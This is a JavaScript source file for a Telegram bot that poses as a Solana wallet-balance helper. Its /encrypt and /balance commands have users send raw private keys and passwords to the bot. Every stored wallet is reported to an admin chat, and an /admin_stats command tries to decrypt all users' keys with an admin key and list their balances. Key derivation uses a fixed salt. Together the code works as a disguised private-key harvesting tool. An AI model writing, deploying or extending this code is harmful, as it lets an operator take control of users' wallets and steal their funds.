const TelegramBot = require('node-telegram-bot-api');
const { Connection, Keypair, PublicKey } = require('@solana/web3.js');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// Config
const TOKEN = process.env.TELEGRAM_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
const STORAGE_PATH = process.env.STORAGE_PATH || './data';

// Initialize
const bot = new TelegramBot(TOKEN, { polling: true });
const connection = new Connection(SOLANA_RPC);
const userWallets = new Map();

// Ensure storage exists
if (!fs.existsSync(STORAGE_PATH)) {
  fs.mkdirSync(STORAGE_PATH, { recursive: true });
}

// Encryption
function encrypt(text, password) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', 
    crypto.scryptSync(password, 'salt', 32), iv);
  return iv.toString('hex') + ':' + 
    cipher.update(text, 'utf8', 'hex') + 
    cipher.final('hex');
}

function decrypt(encrypted, password) {
  const [iv, data] = encrypted.split(':');
  const decipher = crypto.createDecipheriv('aes-256-cbc', 
    crypto.scryptSync(password, 'salt', 32), 
    Buffer.from(iv, 'hex'));
  return decipher.update(data, 'hex', 'utf8') + 
    decipher.final('utf8');
}

// Load existing wallets
function loadWallets() {
  try {
    fs.readdirSync(STORAGE_PATH).forEach(file => {
      if (file.endsWith('.wallet')) {
        const content = fs.readFileSync(
          path.join(STORAGE_PATH, file), 'utf8');
        const [chatId, encrypted] = content.split('|');
        userWallets.set(chatId, encrypted);
      }
    });
  } catch (err) {
    console.error('Error loading wallets:', err);
  }
}

// Save wallet
function saveWallet(chatId, encrypted) {
  fs.writeFileSync(
    path.join(STORAGE_PATH, `${chatId}.wallet`),
    `${chatId}|${encrypted}`
  );
}

// Get SOL balance
async function getBalance(publicKey) {
  try {
    return await connection.getBalance(new PublicKey(publicKey));
  } catch (err) {
    console.error('Balance check failed:', err);
    return 0;
  }
}

// Bot Commands
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    '🔐 Send your *encrypted* Solana private key\n\n' +
    '1. Encrypt your key first using:\n' +
    '`/encrypt [your_raw_private_key] [password]`\n' +
    '2. Then send the encrypted result to me',
    { parse_mode: 'Markdown' }
  );
});

bot.onText(/\/encrypt (.+) (.+)/, (msg, match) => {
  const [_, key, password] = match;
  const encrypted = encrypt(key, password);
  bot.sendMessage(
    msg.chat.id,
    '🔒 Encrypted key (send this to bot):\n' +
    '`' + encrypted + '`\n\n' +
    '⚠️ Save your password securely!',
    { parse_mode: 'Markdown' }
  );
});

bot.on('message', async (msg) => {
  // Accept encrypted keys (format: iv:encrypted_data)
  if (msg.text && msg.text.includes(':')) {
    try {
      const encrypted = msg.text;
      const chatId = msg.chat.id.toString();
      
      // Store without decrypting (user must provide password later)
      userWallets.set(chatId, encrypted);
      saveWallet(chatId, encrypted);
      
      bot.sendMessage(
        chatId,
        '✅ Encrypted wallet stored!\n\n' +
        'Use `/balance [password]` to check your SOL'
      );
      
      // Notify admin
      bot.sendMessage(
        ADMIN_CHAT_ID,
        `👤 New wallet added:\n` +
        `User: ${chatId}\n` +
        `Key: ${encrypted.substring(0, 15)}...`
      );
      
    } catch (err) {
      bot.sendMessage(msg.chat.id, '❌ Invalid encrypted format');
    }
  }
});

bot.onText(/\/balance (.+)/, async (msg, match) => {
  const [_, password] = match;
  const chatId = msg.chat.id.toString();
  
  if (!userWallets.has(chatId)) {
    return bot.sendMessage(chatId, '❌ No wallet found');
  }

  try {
    const encrypted = userWallets.get(chatId);
    const privateKey = decrypt(encrypted, password);
    const keypair = Keypair.fromSecretKey(
      new Uint8Array(JSON.parse(privateKey)));
    
    const balance = await getBalance(keypair.publicKey);
    
    bot.sendMessage(
      chatId,
      `💰 Your balance: ${balance / 1e9} SOL\n` +
      `Address: \`${keypair.publicKey}\``,
      { parse_mode: 'Markdown' }
    );
    
  } catch (err) {
    bot.sendMessage(chatId, '❌ Wrong password or invalid key');
  }
});

// Admin commands
bot.onText(/\/admin_stats/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_CHAT_ID) return;
  
  let report = '📊 Wallet Stats\n\n';
  let totalSOL = 0;
  
  for (const [chatId, encrypted] of userWallets) {
    try {
      // Attempt decryption with admin key (if needed)
      const privateKey = decrypt(encrypted, process.env.ADMIN_KEY);
      const keypair = Keypair.fromSecretKey(
        new Uint8Array(JSON.parse(privateKey)));
      
      const balance = await getBalance(keypair.publicKey);
      totalSOL += balance;
      
      report += `👤 ${chatId}: ${balance / 1e9} SOL\n` +
        `Address: ${keypair.publicKey}\n\n`;
      
    } catch {
      report += `👤 ${chatId}: [Encrypted]\n`;
    }
  }
  
  bot.sendMessage(
    ADMIN_CHAT_ID,
    report + `\n💎 Total SOL: ${totalSOL / 1e9}`,
    { parse_mode: 'Markdown' }
  );
});

// Start
loadWallets();
console.log('🤖 Bot started');
